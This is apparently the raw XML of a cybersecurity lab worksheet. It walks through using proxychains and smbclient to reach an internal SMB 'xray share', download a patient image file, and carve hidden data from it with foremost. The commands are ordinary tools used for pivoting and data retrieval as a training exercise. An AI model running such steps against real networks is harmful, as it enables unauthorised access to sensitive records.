          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0051062B">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>windows 10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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un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sm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cl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ent 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g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st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inte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l h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st (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y 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ch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IP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e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y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ne)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo proxychains smbclient </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">L 172.31.1.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>U moo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Which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(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ny)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y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u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sc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v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er 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?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ord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here:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="9420"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Ho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:position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808080"/>
          <w:spacing w:val="-1"/>
          <w:position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808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position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808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:spacing w:val="-1"/>
          <w:position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808080"/>
          <w:position w:val="-1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808080"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F44384">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>.11(deny),.12(working)- xray share.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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8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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Acc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the XRAY Shar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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 xml:space="preserve">d </w:t>
      </w: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F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older</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Conne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ing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sm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cl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ent:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sudo proxychains smbclient /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31.1.12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">xrays </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>U moo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>di</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC660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, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-80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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-77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v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igate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nd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wnl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il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 yo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K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li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pr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ile.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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own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py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of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ll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v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ered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il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4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(e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pg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)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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9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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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A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nal</w:t>
      </w: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y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>z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e the</w:t>
      </w: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Files</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="4747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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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wi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ch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o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K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li,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nd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v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iga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e to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he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k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li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pr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ile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/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ho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me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/k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li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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open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ownl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ed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il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wi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Li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br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ff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3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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>libreoffice &lt;filename&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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v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iew for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hi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en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g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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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y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ze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ny i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g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or h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en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g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sing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC660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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">foremost </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="132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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>PatientX_24601.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="261" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="563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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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Check t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e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ut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ut/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ol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er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ore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cr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.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.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
